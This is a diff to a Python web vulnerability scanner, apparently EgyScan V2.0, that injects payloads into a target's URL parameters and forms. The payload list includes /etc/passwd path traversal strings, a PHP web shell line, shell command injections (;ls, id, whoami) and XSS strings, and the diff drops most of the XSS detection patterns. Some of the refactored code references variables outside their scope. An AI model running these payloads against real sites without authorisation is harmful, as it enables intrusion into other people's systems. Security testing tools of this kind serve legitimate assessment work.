@@ -1,6 +1,5 @@
 import logging
 import tqdm
-import warnings
 import random
 import re
 import urllib3
@@ -16,6 +15,9 @@ import ssl
 import traceback
 import defusedxml.ElementTree as ET
 import functools
+import argparse
+from typing import Set
+from typing import List, Dict, Any, Optional
 from queue import Queue
 from colorama import Fore, Style, init
 from bs4 import BeautifulSoup
@@ -23,6 +25,9 @@ from urllib.parse import urlparse, parse_qs, urljoin, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from itertools import islice
 from urllib.robotparser import RobotFileParser
+from urllib3.util.retry import Retry
+from requests.exceptions import RequestException
+from requests.adapters import HTTPAdapter
 from bs4 import MarkupResemblesLocatorWarning
 
 
@@ -36,9 +41,13 @@ payloads = [
     "../../../../etc/passwd%00",
     "<?php system($_GET['cmd']); ?>",
     "../../../../etc/passwd",
+    "%22==alert(document.domain)||%22",
     "%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo",
     ";ls",
     "ls",
+    "id",
+    "whoami",
+    "uname -a",
     "&lt;script&gt;alert('AliElTop')&lt;/script&gt;",
     "+9739343777;phone-context=<script>alert(AliElTop)</script>",
     "+91 97xxxx7x7;ext=1;ext=2",
@@ -837,7 +846,6 @@ def check_rce(url):
 
         rce_patterns = [
             r"root:",
-            r"passwd",
             
         ]
 
@@ -856,28 +864,6 @@ def check_xss(url):
         response.raise_for_status()
 
         xss_patterns = [
-            r"on\w+\s*=",
-            r"javascript:\s*;",
-            r"eval\(",
-            r"document\.cookie",
-            r"document\.write\(",
-            r"document\.location\(",
-            r"window\.location\(",
-            r"location\.href",
-            r"<img[^>]*\s+src\s*=\s*[\"']([^\"'>]+)[\"'][^>]*>",
-            r"<iframe[^>]*>",
-            r"<object[^>]*>",
-            r"<embed[^>]*>",
-            r"<video[^>]*>",
-            r"<audio[^>]*>",
-            r"<svg[^>]*>",
-            r"&#x.{1,5};",
-            r"%[0-9a-fA-F]{2}",
-            r"&#\d+;",
-            r"expression\(",
-            r"url\(",
-            r"url\s*\(",
-            r"import\s*(",
             r"AliElTop",
         ]
 
@@ -1641,29 +1627,28 @@ def collect_urls(target_url, num_threads=10, session=None):
 
         return set()
 
+    def worker():
+        while True:
+            current_url = task_queue.get()
+            if current_url is None:
+                task_queue.task_done()
+                break
+            if validate_url(current_url):
+                filtered_urls = process_url(current_url)
+                task_queue.task_done()
+            else:
+                task_queue.task_done()
+                logging.warning(f"Invalid URL: {current_url}")
+
     with tqdm.tqdm(total=len(urls), desc="Collecting URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
         task_queue = Queue()
 
-        @functools.lru_cache(maxsize=None)
         def validate_url(url):
             try:
                 parsed_url = urlparse(url)
                 return all([parsed_url.scheme, parsed_url.netloc])
             except ValueError:
                 return False
-
-        def worker():
-            while True:
-                current_url = task_queue.get()
-                if current_url is None:
-                    task_queue.task_done()
-                    break
-                if validate_url(current_url):
-                    filtered_urls = process_url(current_url)
-                    task_queue.task_done()
-                else:
-                    task_queue.task_done()
-                    logging.warning(f"Invalid URL: {current_url}")
 
         workers = []
         for _ in range(num_threads):
@@ -1686,11 +1671,11 @@ def collect_urls(target_url, num_threads=10, session=None):
         for _ in range(num_threads):
             task_queue.put(None)
 
-        for worker in workers:
-            worker.join()
+        for worker_thread in workers:
+            worker_thread.join()
 
     return processed_urls
-    
+ 
 detected_wafs = []
 
 common_wafs = {
@@ -1735,25 +1720,57 @@ common_wafs = {
     "vidado": ["vidado"],
 }
 
+def print_warning(message):
+    print(f"\033[93m{message}\033[0m")
+
+
+def make_request(url, data=None, method="GET", headers=None, retries=3, backoff_factor=0.3, timeout=10):
+    user_agent = random.choice(USER_AGENTS)
+    request_headers = {
+        "User-Agent": user_agent
+    }
+    if headers:
+        request_headers.update(headers)
+
+    session = requests.Session()
+
+    retry_strategy = Retry(
+        total=retries,
+        backoff_factor=backoff_factor,
+        allowed_methods=frozenset(["GET", "POST"]),
+        status_forcelist=[500, 502, 503, 504, 404],
+    )
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+
+    try:
+        with session.request(method=method, url=url, data=data, headers=request_headers, timeout=timeout) as response:
+            response.raise_for_status()  
+            return response
+    except RequestException as e:
+        print(f"Error occurred while making the request: {e}")
+        return None
+
+
+def scan_form(form):
+    form_action = form.get("action")
+    if form_action:
+        if not form_action.startswith("http"):
+            form_action = urljoin(base_url, form_action)
+        form_inputs = form.find_all(["input", "textarea"])
+        form_data = {input_field.get("name"): input_field.get("value") for input_field in form_inputs}
+
+        if tokens:
+            form_data.update(tokens)
+
+        inject_payloads(form_action, form_data, payloads, vulnerable_urls, headers=headers)
+
 def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=10):
     parsed_url = urlparse(url)
     params = parse_qs(parsed_url.query)
     vulnerable_urls = set()
     detected_wafs = []
-
-    def make_request(url, data=None, method="GET", headers=None):
-        user_agent = random.choice(USER_AGENTS)
-        request_headers = {
-            "User-Agent": user_agent
-        }
-        if headers:
-            request_headers.update(headers)
-        try:
-            with requests.request(method=method, url=url, data=data, headers=request_headers) as response:
-                return response
-        except requests.exceptions.RequestException as e:
-            print(f"Error occurred: {e}")
-            return None
 
     def inject_payloads(url, params, payloads, vulnerable_urls, headers=None):
         base_url = urlparse(url).scheme + "://" + urlparse(url).netloc
@@ -1770,25 +1787,6 @@ def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=1
                     if response is not None:
                         scan_response(response, vulnerable_urls)
 
-    def scan_response(response, vulnerable_urls):
-        for check_func, vulnerability_type in vulnerability_checks.items():
-            if check_func(response.url):
-                print_warning(f"{vulnerability_type}{response.url}\n")
-                vulnerable_urls.add(response.url)
-
-    def scan_form(form):
-        form_action = form.get("action")
-        if form_action:
-            if not form_action.startswith("http"):
-                form_action = urljoin(base_url, form_action)
-            form_inputs = form.find_all(["input", "textarea"])
-            form_data = {input_field.get("name"): input_field.get("value") for input_field in form_inputs}
-
-            if tokens:
-                form_data.update(tokens)
-
-            inject_payloads(form_action, form_data, payloads, vulnerable_urls, headers=headers)
-
     inject_payloads(url, params, payloads, vulnerable_urls, headers=headers)
 
     response = make_request(url, headers=headers)
@@ -1804,16 +1802,44 @@ def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=1
 
     form_chunks = [forms[i:i + threads] for i in range(0, len(forms), threads)]
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        executor.map(scan_form, forms)
-
+    try:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            for form_chunk in tqdm(form_chunks, desc="Scanning forms", unit=" forms", leave=False):
+                executor.map(scan_form, form_chunk)
+    except KeyboardInterrupt:
+        print_warning("\nScan interrupted by user (Ctrl+C). Exiting gracefully...")
+        executor.shutdown(wait=False)
+        
     if detected_wafs:
         print("Detected WAFs:")
         for waf in detected_wafs:
             print(f"- {waf}")
 
     return vulnerable_urls
+    
+def scan_response(response, vulnerable_urls):
+    url = response.url
 
+    try:
+        response.raise_for_status()
+    except requests.exceptions.HTTPError as e:
+        print_warning(f"HTTP Error {e.response.status_code}: {url}\n")
+        return
+
+    def check_vulnerability(check_func, vulnerability_type):
+        try:
+            if check_func(url):
+                print_warning(f"{vulnerability_type}{url}\n")
+                vulnerable_urls.add(url)
+        except Exception as e:
+            print_warning(f"Error occurred while checking vulnerability: {e}\n")
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = [executor.submit(check_vulnerability, check_func, vulnerability_type) for check_func, vulnerability_type in vulnerability_checks.items()]
+
+    for future in concurrent.futures.as_completed(futures):
+        future.result()
+    
 vulnerability_checks = {
     check_sqli: "SQL Injection\n",
     check_rce: "Remote Code Execution\n",
@@ -1919,6 +1945,9 @@ def get_target_url():
             continue
 
         return user_input
+
+VULNERABLE_URLS_FILE = 'vulnerable_urls.txt'
+
 def main():
     print_logo()
     print("EgyScan V2.0\nhttps://github.com/dragonked2/Egyscan")
